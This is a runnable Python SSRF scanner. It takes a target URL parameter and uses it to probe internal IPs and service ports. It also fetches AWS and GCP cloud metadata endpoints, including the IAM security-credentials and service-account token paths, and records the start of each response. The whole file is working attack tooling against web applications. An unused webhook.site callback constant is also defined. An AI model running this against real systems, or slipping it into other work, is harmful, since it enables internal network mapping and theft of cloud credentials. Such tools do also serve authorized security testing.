#!/usr/bin/env python3
"""Server-Side Request Forgery Scanner"""
import argparse
import json
import requests
import socket
from urllib.parse import urlparse

class SSRFScanner:
    CALLBACK_BASE = "https://webhook.site"
    INTERNAL_HOSTS = [
        '127.0.0.1', 'localhost', '0.0.0.0',
        '10.0.0.1', '10.0.0.2', '172.16.0.1', '192.168.1.1',
        '169.254.169.254', 'metadata.google.internal'
    ]
    INTERNAL_PORTS = [22, 80, 443, 3306, 5432, 6379, 9200, 11211, 27017, 2375, 2379]

    def __init__(self, target_url, param_name='url', method='POST'):
        self.target = target_url
        self.param = param_name
        self.method = method
        self.findings = []

    def test_url(self, url):
        try:
            data = {self.param: url}
            if self.method == 'GET':
                resp = requests.get(self.target, params=data, timeout=10)
            else:
                resp = requests.post(self.target, json=data, timeout=10)
            return resp
        except:
            return None

    def scan_internal_hosts(self):
        for host in self.INTERNAL_HOSTS:
            for port in self.INTERNAL_PORTS:
                url = f'http://{host}:{port}/'
                resp = self.test_url(url)
                if resp and resp.status_code < 500:
                    self.findings.append({
                        'type': 'internal_access',
                        'host': host,
                        'port': port,
                        'status': resp.status_code,
                        'response_length': len(resp.text) if resp.text else 0
                    })
        return self.findings

    def scan_cloud_metadata(self):
        metadata_urls = [
            'http://169.254.169.254/latest/meta-data/',
            'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
            'http://metadata.google.internal/computeMetadata/v1/',
            'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token'
        ]
        for url in metadata_urls:
            resp = self.test_url(url)
            if resp and resp.status_code == 200 and len(resp.text) > 10:
                self.findings.append({
                    'type': 'cloud_metadata_access',
                    'url': url,
                    'data_preview': resp.text[:500]
                })
        return self.findings

    def scan(self):
        self.scan_internal_hosts()
        self.scan_cloud_metadata()
        return {'target': self.target, 'findings': self.findings}

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('--url', required=True)
    parser.add_argument('--param', default='url')
    parser.add_argument('--method', default='POST')
    args = parser.parse_args()
    scanner = SSRFScanner(args.url, args.param, args.method)
    print(json.dumps(scanner.scan(), indent=2))
